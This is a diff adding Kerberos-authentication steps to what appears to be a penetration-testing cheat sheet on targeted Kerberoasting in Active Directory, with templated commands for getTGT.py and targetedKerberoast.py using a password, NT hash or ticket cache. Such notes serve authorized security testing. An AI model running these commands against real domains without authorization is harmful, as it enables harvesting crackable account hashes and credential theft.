@@ -10,6 +10,16 @@ With password -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>'
 
 With nt hash  -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>' -H :<nt hash>`
 
+<br>
+
+Kerberos Authentication:
+
+`getTGT.py <domain>/<user>:<password> -dc-ip <dc_ip>`
+
+`export KRB5CCNAME=<file.ccache>`
+
+`targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<password>' -k --dc-host <machine.domain>`
+
 Note: If clock error appears "KRB_AP_ERR_SKEW" use kerberos sync command before.
 
 <br>
